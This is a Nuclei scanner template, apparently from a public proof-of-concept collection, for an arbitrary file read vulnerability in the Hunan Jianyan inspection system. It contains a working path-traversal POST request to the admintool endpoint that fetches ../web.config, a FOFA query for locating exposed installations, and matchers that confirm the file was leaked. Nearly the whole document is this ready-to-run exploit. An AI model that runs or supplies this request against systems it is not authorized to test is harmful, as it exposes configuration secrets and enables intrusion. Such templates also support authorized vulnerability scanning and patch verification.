id: hunanjianyan-admintool-fileread
info:
  name: 湖南建研-检测系统 admintool 存在任意文件读取
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E6%B9%96%E5%8D%97%E5%BB%BA%E7%A0%94%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F/%E6%B9%96%E5%8D%97%E5%BB%BA%E7%A0%94-%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%20admintool%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: (body="/Content/Theme/Standard/webSite/login.css" && body="/Content/Theme/Standard/webSite/images/bg.jpg") || body="Login/QRLogin.ashx"
    tips:
    repair:
    version:
  tags: hunanjianyan,fileread

http:
  - raw:
      - |
        POST /Scripts/admintool?type=file HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip, deflate, br

        filePath=../web.config
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'读取文件成功','xml version')
        condition: and